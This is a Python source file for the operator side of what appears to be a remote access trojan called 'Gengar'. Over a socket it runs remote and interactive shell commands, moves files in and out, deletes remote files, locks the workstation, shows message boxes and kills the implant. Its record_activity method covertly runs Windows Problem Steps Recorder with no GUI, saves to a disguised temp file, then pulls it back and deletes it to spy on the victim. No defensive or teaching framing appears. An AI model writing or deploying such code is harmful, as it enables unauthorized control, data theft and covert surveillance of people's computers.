import json
import time

import output


class Gengar:
    def __init__(self, sock):
        self._sock = sock

    def _send(self, data):
        self._sock.send(str(len(data)).encode())
        self._sock.send(data.encode())

    def _recv(self, binary=False):
        buff_len = int(self._sock.recv(128).decode())
        if binary:
            return self._sock.recv(buff_len)
        else:
            return self._sock.recv(buff_len).decode().strip()

    def shell(self, cmd):
        print(f'Running: {cmd}')
        payload = json.dumps(dict(cmd='shell', content=cmd))
        self._send(payload)
        return self._recv()

    def lock_workstation(self):
        print('Locking workstation')
        self.shell('rundll32 user32.dll,LockWorkStation')

    def msgbox(self, title, content):
        print(f'Messagebox ({title}): {content}')
        payload = json.dumps(dict(cmd='msgbox', title=title, content=content))
        self._send(payload)

    def download(self, remote_path, local_path=None, delete=False):
        payload = json.dumps(dict(cmd='download', path=remote_path))
        file_path = local_path if local_path else output.generate_product_path('file_download')
        print(f'Downloading {remote_path} to {file_path}')
        self._send(payload)
        with open(file_path, 'wb') as _file:
            _file.write(self._recv(binary=True))
        if delete:
            self.shell(f'del /F "{remote_path}"')

    def upload(self, local_path, remote_path):
        print(f'Uploading {local_path} to {remote_path}')
        payload = json.dumps(dict(cmd='upload', path=remote_path, data=open(local_path, 'rb').read().decode()))
        self._send(payload)

    def suicide(self):
        print('Killing Gengar')
        payload = json.dumps(dict(cmd='suicide'))
        self._send(payload)
        self._sock.close()

    def hostname(self):
        return self.shell('hostname')

    def interactive_shell(self):
        while True:
            shell_cmd = input(f'{self.hostname()}$ ')
            if shell_cmd == 'exit':
                print('Exiting')
                break
            print(self.shell(shell_cmd))

    def is_alive(self):
        try:
            self.shell('test')
            return True
        except ConnectionResetError:
            return False

    def record_activity(self, timeout=10):
        record_output_path = r'C:\Windows\Temp\tmp947.zip'
        local_output_path = output.generate_product_path('psr', extension='zip')
        self.shell(f'start /b psr /start /gui 0 /output "{record_output_path}"')
        print(f'Recording for {timeout} seconds.')
        time.sleep(timeout)
        self.shell('psr /stop')
        print('Flushing record')
        time.sleep(5)
        self.download(record_output_path, local_output_path, delete=True)

    def __repr__(self):
        ip, port = self._sock.getpeername()
        return f'Gengar at {ip}'
